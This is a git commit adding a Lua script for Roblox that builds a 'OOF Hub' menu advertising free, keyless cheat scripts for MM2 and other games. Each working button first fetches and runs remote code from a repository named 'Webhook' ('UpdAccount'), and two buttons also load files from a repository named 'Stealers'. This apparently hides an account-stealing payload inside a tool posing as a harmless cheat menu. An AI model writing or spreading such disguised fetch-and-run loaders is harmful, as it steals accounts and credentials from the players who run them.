52453edcef610f7a9443981b16aed1a553fdba04
TylerHIP <scriptstesting062@gmail.com>
2024-10-24 13:31:00 +0800

    Create Library.lua

---
+++ Library.lua
@@ -0,0 +1,51 @@
+local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
+local window = DrRayLibrary:Load("OOF Hub", "Default")
+
+local tab = DrRayLibrary.newTab("MM2 Scripts", "ImageIdHere")
+
+tab.newButton(
+    "Yarhm Hub",
+    "Status: 🟢 This is Keyless! ^^",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Webhook/main/UpdAccount"))()
+loadstring(game:HttpGet("https://github.com/TylerHIP/Stealers/raw/roblox/Muscle.lua"))()
+
+    end
+)
+
+tab.newButton(
+    "X Hub",
+    "Status: 🟢 This is keyless! ^^",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Webhook/main/UpdAccount"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Stealers/roblox/GuiHalloween.lua"))()
+    end
+)
+
+tab.newButton(
+    "Movable and Permanent shiftlock",
+    "Status: 🟢 Also working in any game!",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Webhook/main/UpdAccount"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Universal/Permanent-Shiftlock-V2'))()
+    end
+)
+
+tab.newButton(
+    "FE Animations",
+    "Status: 🟢 It has The new Animations!!",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Webhook/main/UpdAccount"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Animated/main/G", true))()
+    end
+)
+
+
+local tab = DrRayLibrary.newTab("Bloxfruits Scripts", "ImageIdHere")
+
+tab.newButton(
+    "Coming soon",
+    "???",
+    function()
+      
+    end
